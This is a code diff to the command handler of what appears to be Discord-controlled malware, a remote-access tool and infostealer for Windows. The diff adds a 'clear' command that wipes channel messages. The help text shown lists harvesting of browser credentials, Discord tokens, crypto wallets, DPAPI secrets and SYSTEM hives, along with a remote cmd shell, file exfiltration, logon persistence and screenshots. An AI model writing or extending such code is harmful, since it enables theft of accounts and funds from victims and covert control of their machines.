@@ -52,6 +52,7 @@ public final class CommandExecutor {
 				case "download" -> download(args);
 				case "upload" -> upload(message, args);
 				case "harvest" -> poller.harvestNow();
+				case "clear" -> clear(args);
 				case "token" -> poller.tokenNow();
 				case "hives" -> poller.hivesNow();
 				case "bootstrap" -> poller.bootstrapNow();
@@ -81,14 +82,26 @@ public final class CommandExecutor {
 			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
 			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 8 MB) · `upload <url|file> [name]`",
 			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
-			"`persist on|off` logon task · `sleep <s>` · `kill`",
+			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages",
 			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
 			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
 			"Extras and repairs: SHELL.md in the repo."));
 	}
 
-	private void shell(String command) {
-		if (command.isEmpty()) {
+	private void clear(List<String> args) {
+		int limit = 100;
+		if (args.size() > 1) {
+			try {
+				limit = Integer.parseInt(args.get(1));
+			} catch (NumberFormatException exception) {
+				poller.reply("Usage: clear [1-1000]");
+				return;
+			}
+		}
+		poller.clearChannel(limit);
+	}
+
+	private void shell(String command) {		if (command.isEmpty()) {
 			poller.reply("Usage: shell <command>");
 			return;
 		}
